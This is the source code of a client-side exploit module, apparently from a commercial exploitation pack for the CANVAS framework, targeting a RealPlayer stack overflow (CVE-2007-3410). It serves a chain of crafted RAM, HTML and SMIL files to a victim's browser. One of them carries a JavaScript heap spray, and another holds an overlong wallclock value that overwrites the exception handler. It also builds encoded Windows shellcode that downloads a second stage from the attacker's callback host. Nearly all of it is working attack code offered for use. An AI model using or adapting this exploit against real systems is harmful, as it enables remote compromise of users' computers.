#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.canvasos import *

import struct

# GUI info
NAME = "RealPlayer ParseWallClockValue Stack Overflow Vulnerability"

DESCRIPTION = "Vulnerability in RealPlayer ParseWallClockValue"
DOCUMENTATION = {}
DOCUMENTATION['Date public'] = "2007.06.26"
DOCUMENTATION['References'] = "http://www.securityfocus.com/bid/24658"
DOCUMENTATION['VersionsAffected'] = "RealPlayer <= 10.5"
DOCUMENTATION["CVE Name"] = "CVE-2007-3410"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3410"

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_real_wallclock -l 192.168.133.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP SP0-SP2 with IE'],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1        
        self.badstring = ""
        self.name = NAME 
        self.filename = "test.ram"
        self.rmfile = "test.rm"
        self.smilfile = "test.smil"
        self.htmlfile = "test.html"
        return
        
    def redirect(self):
    	
    	filedata = """
<HTML>
  <HEAD>    
    <meta http-equiv="refresh" content="0; url=http://SERVERHOST/RAMFILE?rpurl=http://SERVERHOST/HTMLFILE"/>
  </HEAD>
</HTML>    	
    	"""
    	filedata = filedata.replace('SERVERHOST', self.callback.ip)
      	filedata = filedata.replace('HTMLFILE', self.htmlfile)
      	filedata = filedata.replace('RAMFILE', self.filename)    	
    	
    	return filedata
    	

    def makefile(self):

        filedata = "http://SERVERHOST/RMFILE\r\nhttp://SERVERHOST/SMILFILE\r\n"

      	filedata = filedata.replace('SERVERHOST', self.callback.ip)
      	filedata = filedata.replace('RMFILE', self.rmfile)
      	filedata = filedata.replace('SMILFILE', self.smilfile)
       
        return filedata


    def makefile2(self):

        filedata = """
<HTML> 
<BODY> 

<SCRIPT language="javascript">  

var stackBuffer = "";
var heapSprayToAddress = 0x20202020; 
var payLoadCode = unescape('SHELLCODE'); 
var heapBlockSize = 0x400000; 
var payLoadSize = payLoadCode.length * 2; 
var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
var spraySlide = unescape("%u0c0c%u0c0c"); 
spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
memory = new Array(); 

for (i=0;i<heapBlocks;i++) { 
	memory[i] = spraySlide + payLoadCode; 
} 

function getSpraySlide(spraySlide, spraySlideSize) {
	while (spraySlide.length*2<spraySlideSize) { 
		spraySlide += spraySlide; 
	} 
	
	spraySlide = spraySlide.substring(0,spraySlideSize/2); 
	return spraySlide; 
} 
</SCRIPT> 

</BODY> 
</HTML>
"""
	filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))
       
        return filedata


    def makefile3(self):

        filedata = """
<smil xmlns="http://www.w3.org/2000/SMIL20/CR/Language"> 
  <body> 
    <par> 
      <img src="./1.jpg" begin="wallclock(12:00:00.22222222222222222222222222222222222222222222222222222222SEH9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999+9)" dur="5s"/> 
    </par> 
  </body> 
</smil> 
"""
	filedata = filedata.replace('SEH', "1"*0x500 + "\x20"*0x100)
       
        return filedata

        
    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()

	self.createShellcode()

        # RAM file request
        if clientheader.URL.count(self.filename + "?rpurl=http://" + self.callback.ip + "/" + self.htmlfile):
            self.log("Sending RAM file: %s" % (self.filename))
            h.addHeader('Content-Type', 'audio/x-pn-realaudio')
            sploitstring = self.makefile()
            b.setBody(sploitstring)                           

        # HTML file request
        elif clientheader.URL.count(self.htmlfile):
            self.log("Sending HTML file: %s" % (self.htmlfile))            
            sploitstring = self.makefile2()            
            b.setBody(sploitstring)                           
                       	
        # SMIL file request
        elif clientheader.URL.count(self.smilfile):
            self.log("Sending SMIL file")    
            h.addHeader('Content-Type', 'application/smil')            
            sploitstring = self.makefile3()
            b.setBody(sploitstring)

        # RM file request
        elif clientheader.URL.count(self.rmfile):
            self.log("Sending RM file")            
            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_real_wallclock/test.rm", "rb")
            sploitstring = f.read()
            f.close()            
            self.log("Sending %d bytes" % len(sploitstring))
            h.addHeader("Content-type", "binary/octet-stream")
            h.addHeader("Connection", "close")
            b.setBody(sploitstring)
            
        # Redirect to RAM file
        else:
            sploitstring = self.redirect()
            b.setBody(sploitstring)
            
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def createShellcode(self):                
        host = self.callback.ip
        port = self.callback.port

        httpWrapper = ''
        
        try:
            if self.HTTPMOSDEF:
                print "[!] using HTTP MOSDEF tunneling"
                print "callback: [%s:%d]\n" % (host, port)
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval":0x1000})                
                	
                if self.useSSL:
                    ssl = "s"
                else:
                    ssl = ""                
                    
                sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
                httpWrapper = sc.get()                
                print "[!] HTTP MOSDEF len: %d bytes" % (len(httpWrapper))
        except:
            httpWrapper = ""
            
        rawshellcode = self.createInjectToSelf(host, port, injectme = httpWrapper, movetostack = True)
        
        from encoder import addencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)

        self.shellcode = encoder.encode(rawshellcode)
        
        return self.shellcode
                           
    def run(self):        
        return 1


if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
